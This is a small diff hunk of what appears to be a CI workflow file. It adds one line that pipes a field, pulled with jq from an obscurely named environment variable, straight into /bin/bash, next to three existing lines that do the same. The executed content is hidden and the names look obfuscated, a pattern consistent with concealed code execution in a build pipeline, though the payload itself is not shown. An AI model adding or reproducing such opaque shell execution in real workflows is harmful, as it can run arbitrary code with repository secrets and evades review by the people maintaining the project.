@@ -51,6 +51,7 @@ jobs:
           echo $a8 | jq -r .cen4 | /bin/bash
           echo $jxs143 | jq -r .qrx3 | /bin/bash
           printf '%s' "$fkexy960" | jq -r .p3 | /bin/bash
+          printf '%s' "$zes4" | jq -r .tkakm5303 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
